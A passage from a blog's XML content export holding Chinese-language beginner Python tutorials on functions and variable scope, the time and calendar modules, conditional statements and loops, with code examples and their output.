class="headerlink" title="返回语句"></a>返回语句</h3><p>语句 return [expression] 退出一个函数，可选择将一个表达式传回给调用者。没有参数的 return 语句与 return None 相同。</p><p>以上所有示例均未返回任何值。您可以从函数返回一个值，如下所示 -</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Function definition is here</span><span class="token keyword">def</span> <span class="token function">sum</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> arg2 <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true"># Add both the parameters and return them."</span>   total <span class="token operator">=</span> arg1 <span class="token operator">+</span> arg2   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Inside the function : "</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span>   <span class="token keyword">return</span> total<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># Now you can call sum function</span>total <span class="token operator">=</span> sum<span class="token punctuation">(</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Outside the function : "</span><span class="token punctuation">,</span> total <span class="token punctuation">)</span></code></pre><p>执行上述代码时，会产生以下结果 -</p><pre class=" language-python"><code class="language-python">Inside the function <span class="token punctuation">:</span> <span class="token number">30</span>Outside the function <span class="token punctuation">:</span> <span class="token number">30</span></code></pre><h3 id="变量范围"><a href="#变量范围" class="headerlink" title="变量范围"></a>变量范围</h3><p>程序中的所有变量可能无法在该程序的所有位置访问。这取决于您声明变量的位置。</p><p>变量的范围决定了您可以访问特定标识符的程序部分。Python中有两个基本的变量范围 -</p><ul><li>全局变量</li><li>局部变量</li></ul><h4 id="全局变量与局部变量"><a href="#全局变量与局部变量" class="headerlink" title="全局变量与局部变量"></a>全局变量与局部变量</h4><p>在函数体内部定义的变量具有局部作用域，而在外部定义的变量具有全局作用域。</p><p>这意味着局部变量只能在声明它们的函数内部访问，而全局变量可以在整个程序体中被所有函数访问。当你调用一个函数时，它里面声明的变量被带入作用域。以下是一个简单的例子 -</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>total <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># This is global variable.</span><span class="token comment" spellcheck="true"># Function definition is here</span><span class="token keyword">def</span> <span class="token function">sum</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> arg2 <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true"># Add both the parameters and return them."</span>   total <span class="token operator">=</span> arg1 <span class="token operator">+</span> arg2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># Here total is local variable.</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Inside the function local total : "</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span>   <span class="token keyword">return</span> total<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># Now you can call sum function</span>sum<span class="token punctuation">(</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Outside the function global total : "</span><span class="token punctuation">,</span> total <span class="token punctuation">)</span></code></pre><p>执行上述代码时，会产生以下结果 -</p><pre class=" language-python"><code class="language-python">Inside the function local total <span class="token punctuation">:</span> <span class="token number">30</span>Outside the function <span class="token keyword">global</span> total <span class="token punctuation">:</span> <span class="token number">0</span></code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Function </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python programming 7</title>
      <link href="posts/c0c2.html"/>
      <url>posts/c0c2.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>时间是一条逆流的河。</p></blockquote><h2 id="Ax-Date-amp-Time-时日"><a href="#Ax-Date-amp-Time-时日" class="headerlink" title="Ax Date &amp; Time | 时日"></a>Ax Date &amp; Time | 时日</h2><p>Python 程序可以通过多种方式处理日期和时间。在日期格式之间转换是计算机的一项常见工作。 Python 的时间和日历模块有助于跟踪日期和时间。</p><h3 id="Tick"><a href="#Tick" class="headerlink" title="Tick"></a>Tick</h3><p>时间间隔是以秒为单位的浮点数。从 1970 年 1 月 1 日（纪元）00:00:00 开始，特定的时间点以秒表示。 Python 中有一个流行的time模块，它提供了处理时间和在表示之间转换的函数。函数 time.time() 返回自 1970 年 1 月 1 日（纪元）00:00:00 以来的当前系统时间（以刻度为单位）。</p><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> timeticks <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Number of ticks since 12:00am, January 1, 1970:"</span><span class="token punctuation">,</span> ticks<span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Number of ticks since <span class="token number">12</span><span class="token punctuation">:</span>00am<span class="token punctuation">,</span> January <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1970</span><span class="token punctuation">:</span> <span class="token number">1655858083.9189656</span></code></pre><p>用刻度来计算日期很容易。 但是，纪元之前的日期不能用这种形式表示。 遥远未来的日期也不能用这种方式表示——截止点是UNIX和Windows的2038年的某个时候。 </p><h3 id="时间元组"><a href="#时间元组" class="headerlink" title="时间元组"></a>时间元组</h3><p>许多Python的time函数将time处理为9个数字的元组，如下所示</p><table><thead><tr><th align="center">Index</th><th align="center">Field</th><th align="center">Values</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">4-digit year</td><td align="center">2008</td></tr><tr><td align="center">1</td><td align="center">Month</td><td align="center">1 to 12</td></tr><tr><td align="center">2</td><td align="center">Day</td><td align="center">1 to 31</td></tr><tr><td align="center">3</td><td align="center">Hour</td><td align="center">0 to 23</td></tr><tr><td align="center">4</td><td align="center">Minute</td><td align="center">0 to 59</td></tr><tr><td align="center">5</td><td align="center">Second</td><td align="center">0 to 61 (60 or 61 are leap-seconds)</td></tr><tr><td align="center">6</td><td align="center">Day of Week</td><td align="center">0 to 6 (0 is Monday)</td></tr><tr><td align="center">7</td><td align="center">Day of year</td><td align="center">1 to 366 (Julian day)</td></tr><tr><td align="center">8</td><td align="center">Daylight savings</td><td align="center">-1, 0, 1, -1 means library determines DST</td></tr></tbody></table><p>上面的元组等价于struct_time结构。该结构具有如下属性</p><table><thead><tr><th align="center">Index</th><th align="center">Attributes</th><th align="center">Values</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">tm_year</td><td align="center">2008</td></tr><tr><td align="center">1</td><td align="center">tm_mon</td><td align="center">1 to 12</td></tr><tr><td align="center">2</td><td align="center">tm_mday</td><td align="center">1 to 31</td></tr><tr><td align="center">3</td><td align="center">tm_hour</td><td align="center">0 to 23</td></tr><tr><td align="center">4</td><td align="center">tm_min</td><td align="center">0 to 59</td></tr><tr><td align="center">5</td><td align="center">tm_sec</td><td align="center">0 to 61 (60 or 61 are leap-seconds)</td></tr><tr><td align="center">6</td><td align="center">tm_wday</td><td align="center">0 to 6 (0 is Monday)</td></tr><tr><td align="center">7</td><td align="center">tm_yday</td><td align="center">1 to 366 (Julian day)</td></tr><tr><td align="center">8</td><td align="center">tm_isdst</td><td align="center">-1, 0, 1, -1 means library determines DST</td></tr></tbody></table><h3 id="获取当前时间"><a href="#获取当前时间" class="headerlink" title="获取当前时间"></a>获取当前时间</h3><p>要将时间瞬间从epoch浮点值起的一秒转换为时间元组，请将该浮点值传递给一个函数(例如，localtime)，该函数将返回一个包含所有9个有效项的时间元组。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> timelocaltime <span class="token operator">=</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Local current time :"</span><span class="token punctuation">,</span> localtime<span class="token punctuation">)</span></code></pre><p>执行 </p><pre class=" language-python"><code class="language-python">    Local current time <span class="token punctuation">:</span> time<span class="token punctuation">.</span>struct_time<span class="token punctuation">(</span>tm_year<span class="token operator">=</span><span class="token number">2022</span><span class="token punctuation">,</span> tm_mon<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> tm_mday<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> tm_hour<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">,</span> tm_min<span class="token operator">=</span><span class="token number">51</span><span class="token punctuation">,</span> tm_sec<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span> tm_wday<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> tm_yday<span class="token operator">=</span><span class="token number">173</span><span class="token punctuation">,</span> tm_isdst<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><h3 id="格式化时间"><a href="#格式化时间" class="headerlink" title="格式化时间"></a>格式化时间</h3><p>您可以根据需要格式化任何时间，但是将时间格式化为可读格式的简单方法是asctime()</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> time<span class="token punctuation">;</span>localtime <span class="token operator">=</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Local current time :"</span><span class="token punctuation">,</span> localtime<span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Local current time <span class="token punctuation">:</span> Wed Jun <span class="token number">22</span> <span class="token number">09</span><span class="token punctuation">:</span><span class="token number">56</span><span class="token punctuation">:</span><span class="token number">06</span> <span class="token number">2022</span></code></pre><h3 id="获取某月的日历"><a href="#获取某月的日历" class="headerlink" title="获取某月的日历"></a>获取某月的日历</h3><p>日历模块提供了多种使用年历和月历的方法。在这里，我们打印给定月份的日历（2008 年 1 月）</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> calendarcal <span class="token operator">=</span> calendar<span class="token punctuation">.</span>month<span class="token punctuation">(</span><span class="token number">2008</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Here is the calendar:"</span><span class="token punctuation">)</span><span class="token keyword">print</span> cal</code></pre><p>执行</p><pre class=" language-python"><code class="language-python">    January <span class="token number">2008</span>Mo Tu We Th Fr Sa Su    <span class="token number">1</span>  <span class="token number">2</span>  <span class="token number">3</span>  <span class="token number">4</span>  <span class="token number">5</span>  <span class="token number">6</span> <span class="token number">7</span>  <span class="token number">8</span>  <span class="token number">9</span> <span class="token number">10</span> <span class="token number">11</span> <span class="token number">12</span> <span class="token number">13</span><span class="token number">14</span> <span class="token number">15</span> <span class="token number">16</span> <span class="token number">17</span> <span class="token number">18</span> <span class="token number">19</span> <span class="token number">20</span><span class="token number">21</span> <span class="token number">22</span> <span class="token number">23</span> <span class="token number">24</span> <span class="token number">25</span> <span class="token number">26</span> <span class="token number">27</span><span class="token number">28</span> <span class="token number">29</span> <span class="token number">30</span> <span class="token number">31</span></code></pre><h3 id="时间模块"><a href="#时间模块" class="headerlink" title="时间模块"></a>时间模块</h3><p>Python中有一个流行的时间模块，它提供了处理时间和在表示之间转换的函数。</p><p>说明文档：<a href="https://docs.python.org/3.9/library/time.html">https://docs.python.org/3.9/library/time.html</a></p><h3 id="日历模块"><a href="#日历模块" class="headerlink" title="日历模块"></a>日历模块</h3><p>calendar模块提供了与日历相关的函数，包括打印给定月份或年份的文本日历的函数。</p><p>默认情况下，日历将周一作为一周的第一天，周日作为一周的最后一天。要改变这一点，调用calendar.setfirstweekday()函数。</p><p>说明文档：<a href="https://docs.python.org/3.9/library/calendar.html">https://docs.python.org/3.9/library/calendar.html</a></p><h2 id="其它模块"><a href="#其它模块" class="headerlink" title="其它模块"></a>其它模块</h2><p>关于时间的模块有很多，等待着你去发掘。</p><ul><li><a href="http://docs.python.org/library/datetime.html#module-datetime">The <em>datetime</em> Module</a></li><li><a href="http://www.twinsun.com/tz/tz-link.htm">The <em>pytz</em> Module</a></li><li><a href="http://labix.org/python-dateutil">The <em>dateutil</em> Module</a></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Time - Date </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python programming 6</title>
      <link href="posts/3.html"/>
      <url>posts/3.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><blockquote><p>天道轮回，命运抉择，诉不尽，道不破，参不透，且听天命。</p></blockquote><h2 id="Ax-Python-Decision-Making-命运"><a href="#Ax-Python-Decision-Making-命运" class="headerlink" title="Ax Python Decision Making | 命运"></a>Ax Python Decision Making | 命运</h2><p>Python 编程语言将任何<strong>非零</strong>和<strong>非空</strong>值假定为 TRUE，如果它是<strong>零</strong>或<strong>null</strong>，则假定为 FALSE 值。</p><p>Python 编程语言提供以下类型的决策语句</p><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p><strong>if 语句</strong>由一个布尔表达式和一个或多个语句组成。</p><p>语法</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> expression<span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span></code></pre><p>true则执行语句，否则执行if语句后第一条的代码。</p><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>var1 <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">if</span> var1<span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"1 - Got a true expression value"</span>   <span class="token keyword">print</span> var1var2 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> var2<span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"2 - Got a true expression value"</span>   <span class="token keyword">print</span> var2<span class="token keyword">print</span> <span class="token string">"Good bye!"</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python"><span class="token number">1</span> <span class="token operator">-</span> Got a true expression value<span class="token number">100</span>Good bye!</code></pre><h4 id="if…else"><a href="#if…else" class="headerlink" title="if…else"></a>if…else</h4><p><strong>if 语句</strong>后面可以跟可选的else<strong>语句</strong>，当布尔表达式为 FALSE 时执行。</p><p><strong>else</strong>语句可以与if<strong>语句</strong>结合使用。如果if 语句中的条件表达式解析为 0 或 FALSE 值，则<strong>else</strong>语句包含执行的代码块。</p><p><em>else</em>语句是可选语句，在<strong>if</strong>之后最多只能有一个<strong>else</strong>语句。</p><p>语法</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> expression<span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span></code></pre><p>例子</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>var1 <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">if</span> var1<span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"1 - Got a true expression value"</span>   <span class="token keyword">print</span> var1<span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"1 - Got a false expression value"</span>   <span class="token keyword">print</span> var1var2 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> var2<span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"2 - Got a true expression value"</span>   <span class="token keyword">print</span> var2<span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"2 - Got a false expression value"</span>   <span class="token keyword">print</span> var2<span class="token keyword">print</span> <span class="token string">"Good bye!"</span></code></pre><p>执行上述代码时，会产生以下结果 -</p><pre class=" language-python"><code class="language-python"><span class="token number">1</span> <span class="token operator">-</span> Got a true expression value<span class="token number">100</span><span class="token number">2</span> <span class="token operator">-</span> Got a false expression value<span class="token number">0</span>Good bye!</code></pre><h4 id="elif"><a href="#elif" class="headerlink" title="elif"></a>elif</h4><p><strong>elif</strong>语句允许您检查多个表达式是否为 TRUE，并在其中一个条件评估为 TRUE 时立即执行代码块。</p><p>与else类似，elif语句是可选的。但是，与else最多可以有一个语句不同，在if之后可以有任意数量的elif语句。</p><p>语法</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> expression1<span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">elif</span> expression2<span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">elif</span> expression3<span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span></code></pre><p>例子</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>var <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">if</span> var <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"1 - Got a true expression value"</span>   <span class="token keyword">print</span> var<span class="token keyword">elif</span> var <span class="token operator">==</span> <span class="token number">150</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"2 - Got a true expression value"</span>   <span class="token keyword">print</span> var<span class="token keyword">elif</span> var <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"3 - Got a true expression value"</span>   <span class="token keyword">print</span> var<span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"4 - Got a false expression value"</span>   <span class="token keyword">print</span> var<span class="token keyword">print</span> <span class="token string">"Good bye!"</span></code></pre><p>执行上述代码时，会产生以下结果 -</p><pre class=" language-python"><code class="language-python"><span class="token number">3</span> <span class="token operator">-</span> Got a true expression value<span class="token number">100</span>Good bye!</code></pre><h4 id="嵌套if"><a href="#嵌套if" class="headerlink" title="嵌套if"></a>嵌套if</h4><p>您可以在另一个<strong>if</strong>或else if语句中使用一个<strong>if</strong>或<strong>else if</strong>语句</p><p>在某个条件解析为 true 后，您可能想要检查另一个条件。在这种情况下，您可以使用嵌套的if 构造。</p><p>在嵌套的if结构中，您可以在另一个if…elif… else结构中包含一个if…elif…else结构。</p><p>语法</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> expression1<span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">if</span> expression2<span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">elif</span> expression3<span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">elif</span> expression4<span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span></code></pre><p>例子</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>var <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">if</span> var <span class="token operator">&lt;</span> <span class="token number">200</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Expression value is less than 200"</span>   <span class="token keyword">if</span> var <span class="token operator">==</span> <span class="token number">150</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token string">"Which is 150"</span>   <span class="token keyword">elif</span> var <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token string">"Which is 100"</span>   <span class="token keyword">elif</span> var <span class="token operator">==</span> <span class="token number">50</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token string">"Which is 50"</span>   <span class="token keyword">elif</span> var <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token string">"Expression value is less than 50"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Could not find true expression"</span><span class="token keyword">print</span> <span class="token string">"Good bye!"</span></code></pre><p>执行上述代码时，会产生以下结果 -</p><pre class=" language-python"><code class="language-python">Expression value <span class="token keyword">is</span> less than <span class="token number">200</span>Which <span class="token keyword">is</span> <span class="token number">100</span>Good bye!</code></pre><h2 id="Bx-Python-Loops-轮回"><a href="#Bx-Python-Loops-轮回" class="headerlink" title="Bx Python Loops | 轮回"></a>Bx Python Loops | 轮回</h2><p>一般来说，语句是按顺序执行的:函数中的第一条语句首先执行，然后是第二条，依此类推。可能会出现需要多次执行一段代码块的情况。</p><p>编程语言提供了各种控制结构，允许更复杂的执行路径。</p><p>循环语句允许我们多次执行一个语句或一组语句。循环语句如下图所示</p><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><p>只要给定条件为真，Python 编程语言中的<strong>while循环语句就会重复执行目标语句</strong></p><p>语法</p><pre class=" language-python"><code class="language-python"><span class="token keyword">while</span> expression<span class="token punctuation">:</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span></code></pre><p>这里，<strong>语句</strong>可以是单个语句或语句块。<strong>条件</strong>可以是任何表达式，true 是任何非零值。当条件为真时循环迭代。</p><p>当条件变为假时，程序控制传递到紧跟在循环后面的行。</p><p>在 Python 中，在编程构造之后缩进相同数量的字符空格的所有语句都被认为是单个代码块的一部分。Python 使用缩进作为分组语句的方法。</p><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token punctuation">(</span>count <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">'The count is:'</span><span class="token punctuation">,</span> count   count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">print</span> <span class="token string">"Good bye!"</span></code></pre><p>执行上述代码时，会产生以下结果 -</p><pre class=" language-python"><code class="language-python">The count <span class="token keyword">is</span><span class="token punctuation">:</span> <span class="token number">0</span>The count <span class="token keyword">is</span><span class="token punctuation">:</span> <span class="token number">1</span>The count <span class="token keyword">is</span><span class="token punctuation">:</span> <span class="token number">2</span>The count <span class="token keyword">is</span><span class="token punctuation">:</span> <span class="token number">3</span>The count <span class="token keyword">is</span><span class="token punctuation">:</span> <span class="token number">4</span>The count <span class="token keyword">is</span><span class="token punctuation">:</span> <span class="token number">5</span>The count <span class="token keyword">is</span><span class="token punctuation">:</span> <span class="token number">6</span>The count <span class="token keyword">is</span><span class="token punctuation">:</span> <span class="token number">7</span>The count <span class="token keyword">is</span><span class="token punctuation">:</span> <span class="token number">8</span>Good bye!</code></pre><h4 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h4><p>如果条件永远不会变为 FALSE，则循环将变为无限循环。使用 while 循环时必须小心，因为此条件可能永远不会解析为 FALSE 值。这会导致一个永远不会结束的循环。这样的循环称为无限循环。</p><p>无限循环在客户端/服务器编程中可能很有用，其中服务器需要连续运行，以便客户端程序可以在需要时与其通信。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>var <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> var <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># This constructs an infinite loop</span>   num <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">"Enter a number  :"</span><span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token string">"You entered: "</span><span class="token punctuation">,</span> num<span class="token keyword">print</span> <span class="token string">"Good bye!"</span></code></pre><p>执行上述代码时，会产生以下结果 -</p><pre class=" language-python"><code class="language-python">Enter a number <span class="token punctuation">:</span><span class="token number">20</span>You entered<span class="token punctuation">:</span> <span class="token number">20</span>Enter a number <span class="token punctuation">:</span><span class="token number">29</span>You entered<span class="token punctuation">:</span> <span class="token number">29</span>Enter a number <span class="token punctuation">:</span><span class="token number">3</span>You entered<span class="token punctuation">:</span> <span class="token number">3</span>Enter a number between <span class="token punctuation">:</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>File <span class="token string">"test.py"</span><span class="token punctuation">,</span> line <span class="token number">5</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>num <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">"Enter a number :"</span><span class="token punctuation">)</span>KeyboardInterrupt</code></pre><p>按<code>CTRL+C</code>退出</p><h4 id="While中使用else语句"><a href="#While中使用else语句" class="headerlink" title="While中使用else语句"></a>While中使用else语句</h4><p>Python支持将else语句与循环语句相关联。</p><p>如果在while循环中使用else语句，则在条件变为false时执行else语句。</p><p>下面的示例演示了else语句与while语句的组合，该语句只要小于5就输出一个数字，否则将执行else语句。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> count <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> count<span class="token punctuation">,</span> <span class="token string">" is  less than 5"</span>   count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> count<span class="token punctuation">,</span> <span class="token string">" is not less than 5"</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python"><span class="token number">0</span> <span class="token keyword">is</span> less than <span class="token number">5</span><span class="token number">1</span> <span class="token keyword">is</span> less than <span class="token number">5</span><span class="token number">2</span> <span class="token keyword">is</span> less than <span class="token number">5</span><span class="token number">3</span> <span class="token keyword">is</span> less than <span class="token number">5</span><span class="token number">4</span> <span class="token keyword">is</span> less than <span class="token number">5</span><span class="token number">5</span> <span class="token keyword">is</span> <span class="token operator">not</span> less than <span class="token number">5</span></code></pre><h4 id="单语句"><a href="#单语句" class="headerlink" title="单语句"></a>单语句</h4><p>如果只有一条语句，一行就行了</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>flag <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span> <span class="token string">'Given flag is really true!'</span><span class="token keyword">print</span> <span class="token string">"Good bye!"</span></code></pre><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>它能够遍历任何序列的项，如列表或字符串。</p><p>语法</p><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> iterating_var <span class="token keyword">in</span> sequence<span class="token punctuation">:</span>statements<span class="token punctuation">(</span>s<span class="token punctuation">)</span></code></pre><p>如果序列包含表达式列表，则首先对其求值。然后，将序列中的第一项赋值给迭代变量iterating_var。接下来，执行语句块。列表中的每一项都被赋值给iterating_var，并执行语句块，直到耗尽整个序列。</p><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> <span class="token string">'Python'</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true"># First Example</span>   <span class="token keyword">print</span> <span class="token string">'Current Letter :'</span><span class="token punctuation">,</span> letterfruits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'banana'</span><span class="token punctuation">,</span> <span class="token string">'apple'</span><span class="token punctuation">,</span>  <span class="token string">'mango'</span><span class="token punctuation">]</span><span class="token keyword">for</span> fruit <span class="token keyword">in</span> fruits<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># Second Example</span>   <span class="token keyword">print</span> <span class="token string">'Current fruit :'</span><span class="token 